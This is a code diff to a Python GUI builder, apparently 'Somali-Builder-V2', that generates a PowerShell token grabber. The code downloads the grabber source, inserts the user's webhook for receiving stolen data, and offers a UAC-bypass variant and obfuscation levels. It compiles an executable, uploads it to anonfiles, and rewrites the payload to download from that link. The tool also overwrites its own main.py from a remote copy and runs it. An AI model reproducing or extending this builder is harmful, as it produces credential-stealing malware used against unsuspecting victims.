@@ -7,7 +7,7 @@ from webbrowser import open as open_web
 from zipfile import ZipFile
 from io import BytesIO
 from shutil import rmtree
-from time import sleep
+from re import search
 
 try:
     import customtkinter as kdot
@@ -54,20 +54,24 @@ extra = r"""
 extra = False
 
 def auto_update():
-    with open('main.py', 'r', encoding='utf-8') as f:
-        code = f.read().splitlines()
-    updated = requests.get('https://raw.githubusercontent.com/KDot227/Somali-Builder-V2/main/main.py').text.splitlines()
-    if code != updated:
-        print("THER IS A NEW UPDATE PLEASE WAIT FOR THE SCRIPT TO UPDATE!!!")
-        with open('main.py', 'w', encoding='utf-8') as f:
-            remove_chars = len(linesep)
-            for line in updated:
-                f.write(f'{line}\n')
-            f.truncate(f.tell() - remove_chars)
-        system('python main.py')
-        _exit(0)
-    else:
+    bypass = False
+    if bypass == True:
         Buidler().mainloop()
+    else:
+        with open('main.py', 'r', encoding='utf-8') as f:
+            code = f.read().splitlines()
+        updated = requests.get('https://raw.githubusercontent.com/KDot227/Somali-Builder-V2/main/main.py').text.splitlines()
+        if code != updated:
+            print("THER IS A NEW UPDATE PLEASE WAIT FOR THE SCRIPT TO UPDATE!!!")
+            with open('main.py', 'w', encoding='utf-8') as f:
+                remove_chars = len(linesep)
+                for line in updated:
+                    f.write(f'{line}\n')
+                f.truncate(f.tell() - remove_chars)
+            system('python main.py')
+            _exit(0)
+        else:
+            Buidler().mainloop()
 
 class Buidler(kdot.CTk):
     def __init__(self):
@@ -234,6 +238,7 @@ class Buidler(kdot.CTk):
             print(e)
             
     def start_button_event(self):
+        # is the code bad? Yes it is. If u wanna fix it and make it look nice thats all u gangy.
         obfuscate = self.obfuscate_dropdown_box.get()
         uac_bypass = self.uac_bypass_check_box.get()
         webhook = self.webhook_box.get()
@@ -243,21 +248,8 @@ class Buidler(kdot.CTk):
             self.url = 'https://raw.githubusercontent.com/KDot227/Powershell-Token-Grabber/main/main_with_uac_bypass.bat'
         self.code = requests.get(self.url).text.replace("YOUR_WEBHOOK_HERE", webhook)
         if build_exe == True:
-            self.top_level_warning = kdot.CTkToplevel(self, width=400, height=200)
-            self.top_level_warning.protocol("WM_DELETE_WINDOW", self.top_level_warning.destroy)
-            self.top_level_warning_frame = kdot.CTkFrame(self.top_level_warning, width=400, height=200, bg_color="gray10")
-            self.top_level_warning_frame.pack(fill="both", expand=True)
-            self.top_level_warning_label = kdot.CTkLabel(self.top_level_warning_frame, text="This will take a while, please be patient.", bg_color="gray10", fg_color="gray75", font=("Arial", 20))
-            self.top_level_warning_label.place(relx=0.5, rely=0.5, anchor="center")
-            self.top_level_warning.update()
-            self.top_level_warning.deiconify()
-            self.top_level_warning.update()
-            self.top_level_warning_label.configure(text="THIS IS STILL UNDER DEVELOPMENT!\nFEATURES LIKE BUILD OWN EXE\nMIGHT NOT WORK\nUSE AT OWN RIST")
-            self.top_level_warning.update()
-            sleep(5)
-            self.top_level_warning.destroy()
             py_code = 'https://raw.githubusercontent.com/KDot227/Powershell-Token-Grabber/main/main.py'
-            system('pip install pycryptodome pypiwin32')
+            system('pip install pycryptodome pypiwin32 tinyaes')
             with open("test.py", "w") as f:
                 f.write(requests.get(py_code).text)
             upx_url = "https://github.com/upx/upx/releases/download/v4.0.1/upx-4.0.1-win64.zip"
@@ -272,8 +264,11 @@ class Buidler(kdot.CTk):
             upload_to_anon = requests.post("https://api.anonfiles.com/upload", files={"file": open("dist/test.exe", "rb")})
             rmtree("dist")
             anon_url = upload_to_anon.json()["data"]["file"]["url"]["full"]
-            direct_download_url = anon_url.replace("https://anonfiles.com/", "https://cdn.anonfiles.com/")
-            self.code.replace('https://github.com/KDot227/Powershell-Token-Grabber/releases/download/Fixed_version/test.exe', direct_download_url)
+            regex = r'\"https://cdn-[0-9]+\.anonfiles\.com/[A-Za-z0-9]+/[A-Za-z0-9]+-[A-Za-z0-9]+/.+?(\")'
+            r = requests.get(anon_url)
+            direct_url = search(regex, r.text).group(0)
+            trimmed_quotes = direct_url[1:-1]
+            self.code = self.code.replace('https://github.com/KDot227/Powershell-Token-Grabber/releases/download/Fixed_version/main.exe', trimmed_quotes)
         if obfuscate == "Level 1":
             self.level1()
             self.create_top_level(f"{self.name} is the finished product!")
